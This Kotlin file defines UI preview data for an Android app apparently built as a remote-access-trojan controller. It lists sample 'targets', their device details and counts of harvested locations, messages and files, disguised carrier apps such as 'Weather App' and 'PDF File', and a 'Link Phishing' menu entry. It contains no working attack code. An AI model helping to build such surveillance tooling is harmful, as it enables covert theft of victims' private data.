package com.ierusalem.androrat.core.data

import com.ierusalem.androrat.R
import com.ierusalem.androrat.core.app.AppLanguage
import com.ierusalem.androrat.features.home.domain.model.Category
import com.ierusalem.androrat.features.home.domain.model.DrawerClicks
import com.ierusalem.androrat.features.home.domain.model.UserProfile
import com.ierusalem.androrat.features.rtc_features.rtc.domain.AndroRtcClient
import com.ierusalem.androrat.features.rtc_features.rtc_info.domain.AcquiredData
import com.ierusalem.androrat.features.rtc_features.rtc_info.domain.AndroRtcClientInfo
import com.ierusalem.androrat.features.rtc_features.rtc_info.domain.DeviceInfo

sealed class AppPreview {

    object PreviewSettings {
        val languages: List<AppLanguage> = listOf(
            AppLanguage.English,
            AppLanguage.Russian,
        )
    }

    object PreviewDrawer {
        val userProfile = UserProfile(
            username = "Ierusalem",
            avatarUrl = "https://guide-images.cdn.ifixit.com/igi/v6bM4OpwhDPjSmRd.large"
        )
        val categories: List<Category> = listOf(
            Category(R.string.kano_rtc, R.drawable.controller, DrawerClicks.NavigateToAndroRtc),
            Category(R.string.link_logs, R.drawable.link_alt, DrawerClicks.NavigateToLinkPhishing),
            Category(R.string.settings, R.drawable.settings_sharp, DrawerClicks.NavigateToSettings),
        )
    }

    object PreviewAndroRtcInfo {
        val androRtcClientInfo = AndroRtcClientInfo(
            targetName = "Gleb",
            deviceInfo = DeviceInfo(
                brand = "Pixel",
                deviceID = "8de445913dacb388",
                model = "Pixel 8",
                id = "OPM1.112334434",
                sdk = "33",
                manufacture = "Google",
                hardware = "x86",
                bootloader = "unknown",
                user = "user",
                type = "eng",
                base = "eng",
                incremental = "13",
                board = "goldfish",
                host = "unknown",
                fingerprint = "unknown",
                display = "unknown",
                imei = "Permission denied",
                versionCode = "12"
            ),
            acquiredData = AcquiredData(
                locations = "12",
                messages = "12",
                files = "12"
            )
        )
    }

    object PreviewAndroRtc {
        val androRtcClients = listOf(
            AndroRtcClient(
                clientName = "Gleb",
                deviceName = "Pixel 8",
                lastOnlineTime = "7:34",
                isOnline = false,
                provider = "Weather App"
            ),
            AndroRtcClient(
                clientName = "Jack",
                deviceName = "Xiomi 10T",
                lastOnlineTime = "10:01",
                isOnline = true,
                provider = "Music app"
            ),
            AndroRtcClient(
                clientName = "Carl",
                deviceName = "Samsung A56",
                lastOnlineTime = "12:34",
                isOnline = false,
                provider = "PDF File"
            )
        )
    }

}